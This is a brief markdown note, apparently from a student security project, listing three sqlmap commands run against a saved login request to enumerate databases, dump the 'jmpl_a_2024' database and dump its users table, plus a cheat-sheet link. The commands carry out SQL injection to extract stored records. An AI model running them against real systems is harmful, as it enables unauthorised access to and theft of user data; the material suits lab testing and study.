# Command used

```
python sqlmap.py -r "E:\VSCode\JMPL_A_2024\sqlmap_files\login" --data="email=admin&password=admin1234" --tables --dbs --output-dir="E:\VSCode\JMPL_A_2024\sqlmap_files"

python sqlmap.py -r "E:\VSCode\JMPL_A_2024\sqlmap_files\login" --data="email=admin&password=admin1234" -D jmpl_a_2024 --dump --output-dir="E:\VSCode\JMPL_A_2024\sqlmap_files"

python sqlmap.py -r "E:\VSCode\JMPL_A_2024\sqlmap_files\login" --data="email=admin&password=admin1234" -D jmpl_a_2024 -T users --dump --output-dir="E:\VSCode\JMPL_A_2024\sqlmap_files"


```

more references goes to [StationX](https://www.stationx.net/sqlmap-cheat-sheet/) or just google it yourself